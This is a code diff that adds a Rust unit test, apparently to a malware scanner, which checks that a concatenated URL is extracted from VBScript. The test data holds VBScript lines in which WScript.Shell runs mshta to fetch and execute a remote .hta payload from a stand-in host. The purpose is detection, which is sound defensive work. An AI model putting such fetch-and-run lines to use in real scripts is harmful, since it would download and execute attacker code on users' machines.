@@ -10147,6 +10147,25 @@ sh.Run "mshta http://vbs-run.example/payload.hta", 0, False"#;
     }
 
     #[test]
+    fn vbs_wscript_shell_run_inline_concat_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta " & "http://vbs-run-concat.example/payload.hta", 0, False"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-run-concat.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS WScript.Shell.Run inline concat URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_wscript_shell_run_variable_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim cmd
